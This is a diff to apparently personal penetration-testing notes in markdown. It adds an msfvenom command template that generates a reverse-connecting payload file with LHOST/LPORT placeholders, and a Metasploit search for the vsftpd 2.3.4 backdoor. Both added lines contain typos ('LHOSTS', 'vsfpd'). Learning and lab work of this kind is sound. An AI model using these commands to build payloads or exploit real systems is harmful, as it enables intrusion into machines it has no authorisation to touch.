@@ -102,6 +102,7 @@ msfvenom --list encoders
 msfvenom --list formats
 msfvenom --list payloads
 msfvenom -a <architecture> -p <payload> LHOST=<> LPORT=<> -i <how many times payload should be encoded> -e <tecnique> -f exe > <>
+msfvenom -p <payload> LHOSTS=<> LPORT=<> -f <format> > <name of shell>
 ```
 
 ### Vulnerability scanning:
@@ -163,6 +164,7 @@ Server used to build and host websites. Uses HTTP protocol and runs on port 8080
 File transfer protocol uses TCP port 21 to facilitate file sharing between server and client.
 **vsftpd V2.3.4** is vulnerable to command execution vulnerability.
 `search vsftpd`
+`search vsfpd_234_backdoor`
 
 **6. SAMBA**
 
